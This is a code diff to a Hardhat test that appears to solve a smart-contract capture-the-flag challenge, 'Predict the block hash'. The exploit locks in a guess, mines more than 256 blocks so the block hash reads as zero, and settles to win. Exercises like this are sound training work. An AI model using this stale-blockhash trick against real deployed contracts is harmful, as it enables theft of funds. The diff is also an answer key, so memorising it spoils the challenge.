@@ -1,4 +1,5 @@
 import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
+import { mineUpTo } from '@nomicfoundation/hardhat-network-helpers';
 import { expect } from 'chai';
 import { Contract } from 'ethers';
 import { ethers } from 'hardhat';
@@ -24,9 +25,18 @@ describe('PredictTheBlockHashChallenge', () => {
   });
 
   it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
+    const exploit = await (
+      await ethers.getContractFactory('PredictTheBlockHashExploit', attacker)
+    ).deploy(target.address);
+    await exploit.deployed();
+
+    const lockInGuessTx = await exploit.lockInMyGuess({ value: utils.parseEther('1') });
+    await lockInGuessTx.wait();
+
+    // we settle after at least 256 blocks (so `block.blockhash` returns 0x0)
+    await mineUpTo(300);
+    const settleTx = await exploit.tryToSettle();
+    await settleTx.wait();
 
     expect(await target.isComplete()).to.equal(true);
   });
